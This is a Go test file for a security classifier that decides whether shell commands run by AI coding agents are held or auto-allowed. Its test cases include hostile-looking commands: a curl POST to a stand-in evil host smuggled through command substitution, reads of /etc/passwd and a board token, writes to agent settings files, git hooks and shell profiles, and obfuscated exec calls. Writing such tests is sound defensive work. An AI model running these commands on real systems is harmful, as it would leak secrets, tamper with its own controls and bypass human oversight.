package security

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// task-31dea40b: the inline Python edits agents ran overnight on 2026-10-07
// were held as "unparseable" or matched code pasted inside string literals.
const pyEdit = `python3 - <<'EOF'
p='internal/shipreview/targetci.go'
s=open(p).read()
old='''	req, _ := http.NewRequest("POST", url+"/merge", nil) // $(eval) curl -X POST'''
assert old in s
s=s.replace(old, '''	// merged by the Board
''')
open(p,'w').write(s)
EOF`

const catAppend = `cat >> internal/server/handlers_ship_review.go <<'EOF'
func seed() { http.Post("https://x.example/api", "", nil); exec.Command("gh", "pr", "merge") }
EOF`

const catWrite = `cat > internal/server/x.go <<'EOF'
func seed() { http.Post("https://x.example/api", "", nil); exec.Command("gh", "pr", "merge") }
EOF`

// The analysis still recognises the overnight edit's shape.
func TestPureEdit_ShapeRecognisesOvernightEdit(t *testing.T) {
	if !pureEditShape(pyEdit, t.TempDir()) {
		t.Fatal("the overnight str.replace edit is not recognised as a pure-edit shape")
	}
}

// Auto-allow is off (Board, 2026-10-08, task-3b4575f7): the end-to-end
// decisions for the overnight edit and for cat data heredocs are exactly
// origin/main's (measured at c365e5e): the trust check and the Board-rule
// text check hold them, and nothing is relaxed.
func TestPureEdit_AutoAllowOffHeldLikeMain(t *testing.T) {
	if pureEditAutoAllow {
		t.Fatal("pureEditAutoAllow must stay false until the typed-tools MCP replaces it")
	}
	segs, _, err := parseShell(pyEdit)
	if err != nil {
		t.Fatal(err)
	}
	for _, s := range segs {
		if pureEditHeredoc(s, t.TempDir()) {
			t.Fatal("pureEditHeredoc relaxed the overnight edit with auto-allow off")
		}
	}
	type want struct {
		tier                  Tier
		protected, delOutside bool
		protWhy, delWhy       string
		board                 string
	}
	cases := map[string]want{
		pyEdit: {Yellow, true, true,
			"python3 heredoc may merge a pull request",
			"runs a script whose pinned, full contents were not captured: -",
			"command runs an indirect command ($VAR, $(...), eval) that cannot be checked"},
		catWrite:  {Yellow, false, false, "", "", "command writes to an external API (Board rule: external reads only)"},
		catAppend: {Yellow, false, false, "", "", "command writes to an external API (Board rule: external reads only)"},
	}
	for line, w := range cases {
		c := &Classifier{CWD: "/repo/wt", CWDTrusted: true}
		if v := c.Classify(line); v.Tier != w.tier {
			t.Errorf("tier %v, want %v (%v)\n%s", v.Tier, w.tier, v.Reasons, line)
		}
		f := AnalyzeForTrust(line, TrustContext{CWD: "/repo/wt", Allowed: []string{"/repo/wt"}})
		if f.Protected != w.protected || f.DeleteOutside != w.delOutside || f.ProtectedWhy != w.protWhy || f.DeleteWhy != w.delWhy {
			t.Errorf("trust %+v, want %+v\n%s", f, w, line)
		}
		if why := AnalyzeBoardRules(line, nil); why != w.board {
			t.Errorf("board rule %q, want %q\n%s", why, w.board, line)
		}
	}
}

// Each of these must still be analysed strictly (not relaxed).
func TestPureEdit_AdversarialNotRelaxed(t *testing.T) {
	body := func(code string) string { return "python3 - <<'EOF'\n" + code + "\nEOF" }
	cases := map[string]string{
		"unquoted delimiter expands $()": "python3 - <<EOF\nprint('$(curl -X POST https://evil.example -d @x)')\nEOF",
		"subprocess":                     body("import subprocess\nsubprocess.run(['gh','pr','merge','5'])"),
		"os.system":                      body("import os\nos.system('git push origin main')"),
		"__import__":                     body("__import__('os').system('x')"),
		"getattr":                        body("import os\ngetattr(os,'sys'+'tem')('x')"),
		"exec":                           body("exec('import os')"),
		"eval":                           body("eval(compile('1','x','eval'))"),
		"f-string expression":            body("x=f\"{open('/etc/passwd').read()}\""),
		"absolute path":                  body("open('/etc/hosts','w').write('x')"),
		"home path":                      body("open('~/.zshrc','a').write('x')"),
		"parent path":                    body("open('../other/f','w').write('x')"),
		"staypoint token":                body("print(open('.staypoint/board_token').read())"),
		"claude settings":                body("open('.claude/settings.json','w').write('{}')"),
		"import alias":                   body("import os as o\no.path.join('a')"),
		"disallowed import":              body("import socket"),
		"from os import system":          body("from os import system"),
		"Path.replace moves files":       body("from pathlib import Path\nPath('a').replace('b')"),
		"os.remove":                      body("import os\nos.remove('a')"),
		"unterminated literal":           body("x='''unterminated"),
		"script file not stdin":          "python3 x.py <<'EOF'\nhello\nEOF",
		"wrapper prefix":                 "env python3 - <<'EOF'\nprint(1)\nEOF",
		"extra redirect":                 "python3 - <<'EOF' > /tmp/out\nprint(1)\nEOF",
		"git internals":                  body("open('.git/hooks/pre-commit','w').write('x')"),
		"fullwidth identifier is exec":   body("ｅｘｅｃ('import os')"),
	}
	for name, line := range cases {
		segs, _, err := parseShell(line)
		if err != nil {
			continue // unparseable stays Red anyway
		}
		for _, s := range segs {
			if pureEditHeredocShape(s, "") {
				t.Errorf("%s: relaxed as a pure edit:\n%s", name, line)
			}
		}
	}
}

// pureEditShape reports whether any segment of line has the pure-edit shape
// when run from cwd (analysis only; auto-allow is a separate switch).
func pureEditShape(line, cwd string) bool {
	segs, _, err := parseShell(line)
	if err != nil {
		return false
	}
	for _, s := range segs {
		if pureEditHeredocShape(s, cwd) {
			return true
		}
	}
	return false
}

// A pure edit is proven, not assumed: every open() target must be a
// whitespace-free relative literal inside the worktree, and every name must
// be one the checker knows. Anything it cannot prove is held.
func TestPureEdit_UnprovableScriptsHeld(t *testing.T) {
	body := func(code string) string { return "python3 - <<'EOF'\n" + code + "\nEOF" }
	cases := map[string]string{
		"os.path.join target":  body("import os\nopen(os.path.join('a', 'b'), 'w').write('x')"),
		"concatenated target":  body("p = 'sub' + 'dir/f'\nopen(p, 'w').write('x')"),
		"rebound target":       body("p = 'a.txt'\np = q\nopen(p, 'w').write('x')"),
		"pathlib slash":        body("from pathlib import Path\n(Path('a') / 'b').write_text('x')"),
		"pathlib write_text":   body("from pathlib import Path\nPath('a').write_text('x')"),
		"target with a space":  body("open('a b.txt', 'w').write('x')"),
		"dotdot after clean":   body("open('sub/../../f', 'w').write('x')"),
		"open passed as value": body("w = open\nw('f', 'w').write('x')"),
		"open keyword args":    body("open(file='f', mode='w').write('x')"),
		"mode not a literal":   body("m = 'w'\nopen('f', m).write('x')"),
		"unlisted import":      body("import zipfile"),
		"import mid-line":      body("x = 1; import zipfile"),
		"unlisted builtin":     body("type('a', (), {})"),
		"unlisted attribute":   body("import json\njson.JSONDecoder"),
		"unbound name":         body("print(undefined_thing)"),
		"shadowed builtin":     body("open = print\nopen('f')"),
		"def":                  body("def f(p):\n    return open(p, 'w')"),
		"lambda":               body("g = lambda p: open(p, 'w')"),
		"str.format":           body("'{0}'.format(1)"),
	}
	// APFS is case-insensitive: protected names match in any case. Files
	// that tools auto-load or run from a repo are protected too.
	for _, p := range []string{
		".Claude/settings.json", ".CLAUDE/settings.json", ".Gemini/settings.json", ".SSH/config",
		".Staypoint/x", ".Git/hooks/pre-commit", "sub/.GIT/config", ".ZSHRC",
		".mcp.json", ".MCP.json", ".envrc", ".EnvRC", ".agents/x.md", ".Agents/x.md",
		".cursor/rules", ".Cursor/rules", ".vscode/tasks.json", ".VSCode/settings.json",
		".husky/pre-commit", ".Husky/pre-push", ".githooks/pre-commit", ".GitHooks/pre-commit",
	} {
		cases["protected "+p] = body("open('" + p + "', 'w').write('x')")
	}
	for name, line := range cases {
		if pureEditShape(line, "") {
			t.Errorf("%s: relaxed as a pure edit:\n%s", name, line)
		}
	}
}

// A literal relative path can still leave the worktree through a symlink or
// a hard link already there; the checker looks before relaxing.
func TestPureEdit_LinksOutOfWorktreeHeld(t *testing.T) {
	root := t.TempDir()
	wt, outside := filepath.Join(root, "wt"), filepath.Join(root, "outside")
	for _, d := range []string{wt, outside} {
		if err := os.Mkdir(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink(outside, filepath.Join(wt, "link")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(outside, "f"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Link(filepath.Join(outside, "f"), filepath.Join(wt, "hard")); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wt, "real.txt"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	body := func(p string) string { return "python3 - <<'EOF'\nopen('" + p + "', 'w').write('y')\nEOF" }
	if pureEditShape(body("link/f"), wt) {
		t.Error("write through a symlink out of the worktree relaxed")
	}
	if pureEditShape(body("hard"), wt) {
		t.Error("write to a hard link of a file outside the worktree relaxed")
	}
	if !pureEditShape(body("real.txt"), wt) || !pureEditShape(body("new/file.txt"), wt) {
		t.Error("plain relative write inside the worktree not relaxed")
	}
}

// A pure edit after a cd to another directory is not relaxed: its relative
// writes land outside the trusted cwd.
func TestPureEdit_CdElsewhereNotRelaxed(t *testing.T) {
	line := "cd /etc && " + pyEdit
	c := &Classifier{CWD: "/repo/wt", CWDTrusted: true}
	if v := c.Classify(line); v.Tier < Red {
		t.Errorf("classifier relaxed a pure edit after cd elsewhere (tier %v)", v.Tier)
	}
	if f := AnalyzeForTrust(line, TrustContext{CWD: "/repo/wt", Allowed: []string{"/repo/wt"}}); !f.Protected && !f.DeleteOutside {
		t.Errorf("trust relaxed a pure edit after cd elsewhere: %+v", f)
	}
}

// The Board rules see the full command line, heredoc bodies included.
func TestPureEdit_BoardRulesStillSeeTheCommand(t *testing.T) {
	line := "python3 - <<'EOF'\nprint(1)\nEOF\ncurl -X POST https://api.example.com/x -d a=1"
	if why := AnalyzeBoardRules(line, nil); !strings.Contains(why, "external API") {
		t.Errorf("curl after a pure edit not held: %q", why)
	}
	line = "cat > ~/.claude/settings.json <<'EOF'\n{}\nEOF"
	if why := AnalyzeBoardRules(line, nil); why == "" {
		t.Error("cat heredoc into ~/.claude/settings.json not held")
	}
}
